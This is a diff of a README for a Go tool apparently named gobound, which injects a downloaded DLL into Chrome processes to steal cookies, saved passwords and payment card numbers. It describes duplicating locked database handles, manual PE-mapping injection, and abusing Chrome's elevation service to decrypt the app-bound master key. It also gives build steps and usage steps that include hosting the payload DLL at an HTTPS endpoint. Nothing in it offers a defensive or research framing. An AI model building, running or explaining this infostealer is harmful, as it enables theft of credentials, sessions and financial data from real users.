@@ -8,13 +8,12 @@ this works for v20 cookies/passwords (app bound encryption), for prior versions 
 1. scans all chrome.exe processes for open handles to database files (cookies, login data, web data)
 2. identifies which chrome process owns the database handles
 3. duplicates the handles and extracts locked database files to temp directory
-4. downloads the payload dll
+4. downloads the payload dll from https endpoint
 5. injects the dll into the chrome process that owns the database handles using manual pe mapping
-6. sends temp file paths to the injected dll via named pipe
-7. the dll uses chrome's elevation service to decrypt the master key
-8. the dll reads from the extracted temp files and decrypts cookies, passwords, and saved cards
-9. sends decrypted data back via named pipe
-10. cleans up temp files and saves everything to `chrome_data.json`
+6. the dll uses chrome's elevation service to decrypt the master key
+7. the dll sends the decrypted master key back to the injector via named pipe
+8. injector decrypts all data locally using the master key
+9. cleans up temp files and saves everything to `chrome_data.json`
 
 ## technical details
 
@@ -28,12 +27,13 @@ this works for v20 cookies/passwords (app bound encryption), for prior versions 
 ### extraction flow
 - duplicated handles allow reading sqlite databases that are locked by chrome
 - files are extracted to `os.tempdir()` with naming scheme: `chrome_{dbtype}_{pid}.db`
-- injector sends temp file paths to dll via named pipe using `TEMPFILE:` protocol
-- dll performs sqlite queries directly on temp files instead of trying to access locked files
+- injector performs all sqlite queries and decryption locally after receiving the master key
+- all database processing happens in the injector, not the dll
 
 ### encryption handling
-- uses chrome's `ichromeupdate` elevation service com interface to decrypt app-bound master key
-- master key is used to decrypt aes-gcm encrypted v20 values
+- dll uses chrome's `ichromeupdate` elevation service com interface to decrypt app-bound master key
+- dll sends master key back to injector as hex string via named pipe
+- injector uses the master key to decrypt aes-gcm encrypted v20 values from extracted databases
 - supports extraction from all chrome profiles (default, profile 1, profile 2, etc)
 
 ## building
@@ -49,20 +49,15 @@ go build -o gobound.exe
 
 ```
 cd dll/main
-go build -buildmode=c-shared -ldflags="-s -w" -trimpath -o payload.dll
+go build -buildmode=c-shared -ldflags="-s -w" -trimpath -o gobound.dll
 ```
 
-## usage (if you don't want to add functionality to dll/main/main.go)
+## usage
 
-1. build the injector `go build -o gobound.exe cmd/main.go` 
-2. run `gobound.exe` while chrome is running
-
-## usage (if you want to change the src of dll payload)
-
-1. recompile dll with `go build -buildmode=c-shared -ldflags="-s -w" -trimpath -o payload.dll dll/main/main.go`
-2. host it at an https endpoint
-3. update the download url in `cmd/main.go`
-4. build the injector `go build -o gobound.exe cmd/main.go`
+1. build the dll: `cd dll/main && go build -buildmode=c-shared -ldflags="-s -w" -trimpath -o gobound.dll`
+2. host it at an https endpoint (default pulls latest dll from releases page)
+3. update the download url in `cmd/main.go` to your https url
+4. build the injector: `go build -o gobound.exe cmd/main.go`
 5. run `gobound.exe` while chrome is running
 
 ## output
@@ -73,7 +68,21 @@ go build -buildmode=c-shared -ldflags="-s -w" -trimpath -o payload.dll
 - passwords (profile, url, username, password)
 - cards (profile, name on card, expiration, number)
 
+## architecture
+
+### dll (minimal - ~250 lines)
+- only responsible for decrypting the master key via chrome's com interface
+- init com → decrypt key → send to pipe → exit
+- no database handling, no file operations, no sqlite
+
+### injector (full featured - ~950 lines)
+- handle scanning and file extraction
+- dll injection using manual pe mapping
+- sqlite database parsing (cookies, passwords, cards)
+- aes-gcm decryption using master key from dll
+- output generation
+
 ## dependencies
 
 - github.com/carved4/go-wincall - syscalls and win32 api
-- modernc.org/sqlite - pure go sqlite for reading chrome dbs
+- modernc.org/sqlite - pure go sqlite for reading chrome dbs (injector only)
